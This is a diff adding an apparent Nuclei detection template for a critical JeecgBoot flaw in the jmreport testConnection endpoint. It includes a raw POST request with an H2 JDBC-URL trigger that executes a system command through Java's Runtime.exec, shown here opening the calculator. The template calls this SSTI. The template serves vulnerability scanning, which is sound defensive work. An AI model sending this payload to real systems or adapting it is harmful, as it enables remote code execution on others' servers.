@@ -1,0 +1,47 @@
+id: jeecgboot-ssti-vulnerability
+
+info:
+  name: JEECGBOOT SSTI Vulnerability
+  author: ProjectDiscoveryAI,dostghost
+  severity: critical
+  description: |
+    This template detects a potential Server-Side Template Injection (SSTI) vulnerability in the JEECGBOOT `testConnection` endpoint by sending a specially crafted payload that attempts to execute arbitrary commands.
+  tags: ssti, critical
+
+http:
+  - raw:
+      - |
+        POST /jeecgboot/jmreport/testConnection HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 383
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/login?redirect=/dashboard/analysis
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {
+          "id": "1",
+          "code": "dataSource1",
+          "dbType": "H2",
+          "dbDriver": "org.h2.Driver",
+          "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\u000A$$",
+          "dbName": "test",
+          "dbUsername": "sa",
+          "dbPassword": "",
+          "connectTimes": 5
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        words:
+          - "Exception"
+          - "Runtime"
